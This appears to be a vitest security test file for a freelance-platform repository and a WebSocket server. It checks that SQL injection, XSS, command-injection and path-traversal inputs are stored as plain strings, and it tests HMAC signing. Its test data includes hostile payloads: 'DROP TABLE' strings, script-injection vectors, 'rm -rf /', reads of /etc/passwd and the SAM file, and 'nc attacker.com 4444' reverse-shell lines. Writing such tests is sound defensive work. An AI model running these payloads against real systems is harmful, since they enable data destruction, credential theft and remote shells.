/**
 * Security Tests - Injection and Authentication
 *
 * 测试安全防护机制，包括：
 * - SQL 注入防护
 * - XSS 防护
 * - 命令注入防护
 * - 路径遍历防护
 * - HMAC 签名验证
 *
 * @module tests/security/injection
 * @version 1.0.0
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import Database from "better-sqlite3";
import { ulid } from "ulid";
import { FreelanceRepository } from "../../automaton/src/freelance/repository.js";
import { InteragentWebSocketServer } from "../../automaton/src/interagent/websocket.js";
import { applySchemaV11 } from "../../automaton/src/state/schema-v11.js";
import { createHmac, timingSafeEqual } from "crypto";
import { WebSocket } from "ws";

// ============================================================================
// 测试工具函数
// ============================================================================

/**
 * 创建内存数据库用于测试
 */
function createTestDatabase(): Database.Database {
  const db = new Database(":memory:");
  applySchemaV11(db);
  return db;
}

/**
 * 生成 HMAC 签名
 */
function generateSignature(payload: any, secret: string): string {
  const message = JSON.stringify(payload);
  return createHmac("sha256", secret).update(message).digest("hex");
}

/**
 * 验证 HMAC 签名
 */
function verifySignature(payload: any, signature: string, secret: string): boolean {
  const expectedSignature = generateSignature(payload, secret);
  return timingSafeEqual(
    Buffer.from(signature, "hex"),
    Buffer.from(expectedSignature, "hex")
  );
}

// ============================================================================
// 测试套件
// ============================================================================

describe("Security Tests - Injection and Authentication", () => {
  let db: Database.Database;
  let repository: FreelanceRepository;
  let wsServer: InteragentWebSocketServer;

  beforeEach(() => {
    // 创建测试数据库
    db = createTestDatabase();

    // 创建 repository
    repository = new FreelanceRepository(db);

    // 创建 WebSocket 服务器
    wsServer = new InteragentWebSocketServer({
      port: 0,
      host: "127.0.0.1",
      db,
      enableReconnectionSync: true,
    });
  });

  afterEach(async () => {
    // 清理资源
    if (wsServer) {
      await wsServer.stop();
    }
    if (db) {
      db.close();
    }
  });

  // ==========================================================================
  // 测试场景 1: SQL 注入防护
  // ==========================================================================

  describe("SQL Injection Protection", () => {
    it("should prevent SQL injection in project title", () => {
      const maliciousTitle = "Test Project'; DROP TABLE projects; --";

      // 尝试创建带有 SQL 注入的项目
      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "test-client",
        name: "Test Client",
      });

      // 应该将输入视为普通字符串，而不是 SQL 代码
      const project = repository.createProject({
        platform: "upwork",
        platformProjectId: "test-project-1",
        clientId: client.id,
        title: maliciousTitle,
        description: "Test Description",
      });

      // 验证项目被创建，title 被正确存储
      expect(project).toBeDefined();
      expect(project.title).toBe(maliciousTitle);

      // 验证 projects 表仍然存在（没有被 DROP）
      const tableExists = db
        .prepare(
          "SELECT name FROM sqlite_master WHERE type='table' AND name='projects'"
        )
        .get();
      expect(tableExists).toBeDefined();
    });

    it("should prevent SQL injection in client name", () => {
      const maliciousName = "Client' OR '1'='1";

      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "test-client-sql",
        name: maliciousName,
      });

      // 验证客户端被创建，name 被正确存储
      expect(client).toBeDefined();
      expect(client.name).toBe(maliciousName);

      // 验证没有返回额外的客户端（SQL 注入失败）
      const allClients = db
        .prepare("SELECT * FROM clients WHERE platform = ?")
        .all("upwork");
      expect(allClients.length).toBe(1);
    });

    it("should prevent SQL injection in platformProjectId", () => {
      const maliciousId = "test-id' UNION SELECT * FROM clients--";

      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: maliciousId,
        name: "Test Client",
      });

      // 验证客户端被创建
      expect(client).toBeDefined();

      // 验证只能通过完整 ID 查找
      const found = repository.getClientByPlatformId("upwork", maliciousId);
      expect(found).toBeDefined();
      expect(found?.platformClientId).toBe(maliciousId);
    });

    it("should handle special characters in input safely", () => {
      const specialChars = [
        "\\",
        "'",
        '"',
        ";",
        "--",
        "/*",
        "*/",
        "xp_",
        "DECLARE",
        "EXEC",
      ];

      specialChars.forEach((char) => {
        const client = repository.getOrCreateClient({
          platform: "upwork",
          platformClientId: `test-${char}`,
          name: `Client with ${char}`,
        });

        expect(client).toBeDefined();
        expect(client.name).toContain(char);
      });
    });

    it("should prevent SQL injection in search queries", () => {
      // 创建一些测试数据
      repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "client1",
        name: "Client One",
      });

      repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "client2",
        name: "Client Two",
      });

      // 尝试 SQL 注入搜索
      const maliciousSearch = "'; DROP TABLE clients; --";

      // 搜索应该只返回匹配的客户端
      const clients = db
        .prepare("SELECT * FROM clients WHERE name LIKE ?")
        .all(`%${maliciousSearch}%`);

      // 验证没有返回结果（因为没有匹配的客户端）
      expect(clients.length).toBe(0);

      // 验证 clients 表仍然存在
      const tableExists = db
        .prepare(
          "SELECT name FROM sqlite_master WHERE type='table' AND name='clients'"
        )
        .get();
      expect(tableExists).toBeDefined();
    });
  });

  // ==========================================================================
  // 测试场景 2: XSS 防护
  // ==========================================================================

  describe("XSS Protection", () => {
    it("should escape HTML in project descriptions", () => {
      const xssPayload = "<script>alert('XSS')</script>";

      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "test-client-xss",
        name: "Test Client",
      });

      const project = repository.createProject({
        platform: "upwork",
        platformProjectId: "test-project-xss",
        clientId: client.id,
        title: "Test Project",
        description: xssPayload,
      });

      // 验证 payload 被正确存储（数据库层不转义）
      expect(project.description).toBe(xssPayload);

      // 在实际应用中，输出时应该转义
      // 这里我们验证数据库存储是安全的
      const storedProject = db
        .prepare("SELECT * FROM projects WHERE id = ?")
        .get(project.id);
      expect(storedProject?.description).toBe(xssPayload);
    });

    it("should handle multiple XSS attack vectors", () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(XSS)'>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
      ];

      xssPayloads.forEach((payload) => {
        const client = repository.getOrCreateClient({
          platform: "upwork",
          platformClientId: `xss-${Math.random()}`,
          name: "XSS Test Client",
        });

        const project = repository.createProject({
          platform: "upwork",
          platformProjectId: `xss-project-${Math.random()}`,
          clientId: client.id,
          title: "XSS Test Project",
          description: payload,
        });

        // 验证存储是安全的
        expect(project.description).toBe(payload);
      });
    });

    it("should sanitize user input before storage", () => {
      const maliciousInput = {
        title: "Test <img src=x onerror=alert('XSS')>",
        description: "Desc <script>alert('XSS')</script>",
      };

      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "sanitize-test",
        name: "Sanitize Test Client",
      });

      const project = repository.createProject({
        platform: "upwork",
        platformProjectId: "sanitize-project",
        clientId: client.id,
        ...maliciousInput,
      });

      // 验证输入被正确存储
      expect(project.title).toBe(maliciousInput.title);
      expect(project.description).toBe(maliciousInput.description);

      // 注意：实际的应用层应该在输出时进行转义
      // 数据库层的主要职责是防止 SQL 注入
    });
  });

  // ==========================================================================
  // 测试场景 3: 命令注入防护
  // ==========================================================================

  describe("Command Injection Protection", () => {
    it("should not execute shell commands in input", () => {
      const commandInjection = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 4444",
        "test`whoami`",
        "test$(nc attacker.com 4444)",
        "test; curl attacker.com",
      ];

      commandInjection.forEach((maliciousInput) => {
        const client = repository.getOrCreateClient({
          platform: "upwork",
          platformClientId: maliciousInput,
          name: "Command Injection Test",
        });

        // 验证输入被存储为字符串，而不是执行
        expect(client).toBeDefined();
        expect(client.platformClientId).toBe(maliciousInput);
      });
    });

    it("should prevent command injection in file paths", () => {
      const maliciousPaths = [
        "../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "file.txt; cat /etc/passwd",
        "file.txt && nc attacker.com 4444",
      ];

      maliciousPaths.forEach((maliciousPath) => {
        // 尝试使用恶意路径创建项目
        const client = repository.getOrCreateClient({
          platform: "upwork",
          platformClientId: maliciousPath,
          name: "Path Traversal Test",
        });

        // 验证路径被存储为字符串
        expect(client).toBeDefined();
        expect(client.platformClientId).toBe(maliciousPath);
      });
    });
  });

  // ==========================================================================
  // 测试场景 4: 路径遍历防护
  // ==========================================================================

  describe("Path Traversal Protection", () => {
    it("should prevent path traversal attacks", () => {
      const pathTraversalAttempts = [
        "../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
      ];

      pathTraversalAttempts.forEach((maliciousPath) => {
        const client = repository.getOrCreateClient({
          platform: "upwork",
          platformClientId: maliciousPath,
          name: "Path Traversal Test",
        });

        // 验证路径被存储为字符串，而不是用于文件系统操作
        expect(client).toBeDefined();
        expect(client.platformClientId).toBe(maliciousPath);
      });
    });

    it("should validate file paths before access", () => {
      // 模拟文件访问验证
      const isValidPath = (path: string): boolean => {
        // 基本路径验证规则
        const normalizedPath = path.replace(/\\/g, "/");
        return !normalizedPath.includes("..") && !normalizedPath.startsWith("/");
      };

      const validPaths = [
        "file.txt",
        "documents/report.pdf",
        "data.json",
        "images/photo.jpg",
      ];

      const invalidPaths = [
        "../../../etc/passwd",
        "../file.txt",
        "/etc/passwd",
        "documents/../../secret.txt",
      ];

      validPaths.forEach((path) => {
        expect(isValidPath(path)).toBe(true);
      });

      invalidPaths.forEach((path) => {
        expect(isValidPath(path)).toBe(false);
      });
    });
  });

  // ==========================================================================
  // 测试场景 5: HMAC 签名验证
  // ==========================================================================

  describe("HMAC Signature Verification", () => {
    const secret = "test-secret-key";
    const payload = {
      id: ulid(),
      type: "test-message",
      timestamp: new Date().toISOString(),
      data: "test-data",
    };

    it("should generate correct HMAC signature", () => {
      const signature = generateSignature(payload, secret);

      // 验证签名是 64 字符的十六进制字符串（SHA256）
      expect(signature).toHaveLength(64);
      expect(/^[0-9a-f]{64}$/.test(signature)).toBe(true);
    });

    it("should verify correct HMAC signature", () => {
      const signature = generateSignature(payload, secret);
      const isValid = verifySignature(payload, signature, secret);

      expect(isValid).toBe(true);
    });

    it("should reject incorrect HMAC signature", () => {
      const incorrectSignature = "a".repeat(64);
      const isValid = verifySignature(payload, incorrectSignature, secret);

      expect(isValid).toBe(false);
    });

    it("should reject signatures with wrong secret", () => {
      const signature = generateSignature(payload, secret);
      const wrongSecret = "wrong-secret";
      const isValid = verifySignature(payload, signature, wrongSecret);

      expect(isValid).toBe(false);
    });

    it("should reject signatures for modified payloads", () => {
      const signature = generateSignature(payload, secret);
      const modifiedPayload = { ...payload, data: "modified-data" };
      const isValid = verifySignature(modifiedPayload, signature, secret);

      expect(isValid).toBe(false);
    });

    it("should generate different signatures for different payloads", () => {
      const signature1 = generateSignature(payload, secret);
      const signature2 = generateSignature({ ...payload, data: "different-data" }, secret);

      expect(signature1).not.toBe(signature2);
    });

    it("should use constant-time comparison for security", () => {
      // 时序攻击测试：验证时间差异不会泄露信息
      const correctSignature = generateSignature(payload, secret);
      const incorrectSignature = "b".repeat(64);

      // 多次验证，时间应该相近（常数时间）
      const iterations = 1000;

      const startCorrect = Date.now();
      for (let i = 0; i < iterations; i++) {
        verifySignature(payload, correctSignature, secret);
      }
      const timeCorrect = Date.now() - startCorrect;

      const startIncorrect = Date.now();
      for (let i = 0; i < iterations; i++) {
        verifySignature(payload, incorrectSignature, secret);
      }
      const timeIncorrect = Date.now() - startIncorrect;

      // 时间差异应该很小（在合理范围内）
      const timeDifference = Math.abs(timeCorrect - timeIncorrect);
      expect(timeDifference).toBeLessThan(100); // 100ms 容差
    });
  });

  // ==========================================================================
  // 测试场景 6: WebSocket 消息认证
  // ==========================================================================

  describe("WebSocket Message Authentication", () => {
    it("should reject unsigned messages", async () => {
      await wsServer.start();

      const serverAddress = wsServer.getServerStatus();

      // 尝试发送未签名的消息
      const unsignedMessage = {
        id: ulid(),
        type: "ProgressReport",
        timestamp: new Date().toISOString(),
        source: "did:anp:nanobot:test",
        target: "did:anp:automaton:main",
        payload: {},
      };

      // 监听消息错误事件
      const errorPromise = new Promise((resolve) => {
        wsServer.once("message:error", resolve);
      });

      const ws = new WebSocket(
        `ws://127.0.0.1:${serverAddress.port}/?did=test-did`
      );

      await new Promise((resolve) => {
        ws.on("open", resolve);
      });

      ws.send(JSON.stringify(unsignedMessage));

      const errorData = await Promise.race([
        errorPromise,
        new Promise((resolve) => setTimeout(() => resolve(null), 1000)),
      ]);

      ws.close();

      // 验证消息被处理（可能被拒绝或记录错误）
      expect(errorData).not.toBeNull();
    });

    it("should verify message signatures", async () => {
      const secret = "interagent-secret";
      const payload = {
        id: ulid(),
        type: "ProgressReport",
        timestamp: new Date().toISOString(),
        source: "did:anp:nanobot:test",
        target: "did:anp:automaton:main",
        payload: {
          "anp:taskId": "test-task",
          "anp:progress": 50,
        },
      };

      // 生成签名
      const signature = generateSignature(payload, secret);

      // 添加签名到消息
      const signedMessage = {
        ...payload,
        signature,
      };

      // 验证签名
      const isValid = verifySignature(payload, signature, secret);
      expect(isValid).toBe(true);

      // 修改 payload 应该使签名无效
      const modifiedMessage = { ...signedMessage };
      (modifiedMessage as any).payload["anp:progress"] = 75;

      const isModifiedValid = verifySignature(
        modifiedMessage,
        signature,
        secret
      );
      expect(isModifiedValid).toBe(false);
    });
  });

  // ==========================================================================
  // 测试场景 7: 输入验证
  // ==========================================================================

  describe("Input Validation", () => {
    it("should validate required fields", () => {
      // 缺少必需字段
      expect(() => {
        repository.createProject({
          platform: "upwork",
          platformProjectId: "", // 空字符串
          title: "", // 空字符串
        } as any);
      }).toThrow();
    });

    it("should validate field lengths", () => {
      const longString = "a".repeat(10000);

      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "test-length",
        name: longString,
      });

      // 验证客户端被创建（可能有长度限制）
      expect(client).toBeDefined();

      // 如果有长度限制，名称应该被截断或拒绝
      // 这取决于实现
    });

    it("should validate data types", () => {
      // 尝试传入无效数据类型
      expect(() => {
        repository.createProject({
          platform: "upwork" as any,
          platformProjectId: 123 as any, // 应该是字符串
          title: true as any, // 应该是字符串
        });
      }).toThrow();
    });

    it("should sanitize HTML entities", () => {
      const htmlEntities = {
        "<": "&lt;",
        ">": "&gt;",
        "&": "&amp;",
        '"': "&quot;",
        "'": "&#x27;",
      };

      const description = "Test <script>alert('XSS')</script>";
      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "html-entity-test",
        name: "HTML Entity Test",
      });

      const project = repository.createProject({
        platform: "upwork",
        platformProjectId: "html-entity-project",
        clientId: client.id,
        title: "HTML Entity Test",
        description,
      });

      // 验证描述被正确存储
      expect(project.description).toBe(description);
    });
  });

  // ==========================================================================
  // 测试场景 8: 权限和访问控制
  // ==========================================================================

  describe("Authorization and Access Control", () => {
    it("should restrict access to sensitive operations", () => {
      // 创建一个项目
      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "auth-test-client",
        name: "Auth Test Client",
      });

      const project = repository.createProject({
        platform: "upwork",
        platformProjectId: "auth-test-project",
        clientId: client.id,
        title: "Auth Test Project",
      });

      // 尝试更新项目状态（应该成功）
      repository.updateProjectStatus(project.id, "active");

      // 验证状态已更新
      const updated = repository.getProject(project.id);
      expect(updated?.status).toBe("active");
    });

    it("should prevent unauthorized modifications", () => {
      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "unauth-client",
        name: "Unauthorized Client",
      });

      const project = repository.createProject({
        platform: "upwork",
        platformProjectId: "unauth-project",
        clientId: client.id,
        title: "Unauthorized Project",
      });

      // 在实际应用中，应该验证用户权限
      // 这里我们验证基本的数据完整性
      const retrieved = repository.getProject(project.id);
      expect(retrieved).toBeDefined();
      expect(retrieved?.clientId).toBe(client.id);
    });

    it("should validate ownership before operations", () => {
      const client1 = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "owner-test-client-1",
        name: "Owner Test Client 1",
      });

      const client2 = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "owner-test-client-2",
        name: "Owner Test Client 2",
      });

      const project = repository.createProject({
        platform: "upwork",
        platformProjectId: "owner-test-project",
        clientId: client1.id,
        title: "Owner Test Project",
      });

      // 验证项目属于正确的客户端
      const retrieved = repository.getProject(project.id);
      expect(retrieved?.clientId).toBe(client1.id);
      expect(retrieved?.clientId).not.toBe(client2.id);
    });
  });

  // ==========================================================================
  // 测试场景 9: 敏感数据处理
  // ==========================================================================

  describe("Sensitive Data Handling", () => {
    it("should not log sensitive information", () => {
      const sensitiveData = {
        apiKey: "secret-api-key-12345",
        password: "super-secret-password",
        token: "bearer-token-abc123",
      };

      // 创建客户端（不应该记录敏感数据）
      const client = repository.getOrCreateClient({
        platform: "upwork",
        platformClientId: "sensitive-test-client",
        name: "Sensitive Test Client",
      });

      // 验证敏感数据不在数据库中（以明文形式）
      const allClients = db
        .prepare("SELECT * FROM clients WHERE platform = ?")
        .all("upwork");

      allClients.forEach((c: any) => {
        expect(c.name).not.toContain(sensitiveData.apiKey);
        expect(c.name).not.toContain(sensitiveData.password);
        expect(c.name).not.toContain(sensitiveData.token);
      });
    });

    it("should handle secure data transit", () => {
      // 模拟安全数据传输
      const sensitivePayload = {
        taskId: ulid(),
        secret: "top-secret-data",
      };

      // 在实际应用中，应该使用 TLS/SSL
      // 这里我们验证数据结构
      expect(sensitivePayload).toBeDefined();
      expect(sensitivePayload.taskId).toBeDefined();
      expect(sensitivePayload.secret).toBeDefined();
    });
  });
});
